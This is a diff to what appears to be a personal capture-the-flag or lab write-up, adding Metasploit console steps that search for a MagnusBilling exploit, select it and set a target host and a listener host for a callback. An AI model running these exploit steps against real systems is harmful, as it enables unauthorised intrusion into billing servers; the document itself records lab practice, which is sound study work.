@@ -23,9 +23,18 @@ These are the service running on the server.
 Then we found a exploit on msf console and the service was MagnusBilling
 
 
-search MagnusBilling
+msf > search MagnusBilling
+
 ![[Pasted image 20251025183737.png]]
 
+msf > use 0
+
+msf >show options
 
 ![[Pasted image 20251025184034.png]]
 
+msf >set RHOSTS 10.201.89.202
+
+msf >set LHOST 10.17.17.19
+
+msf >
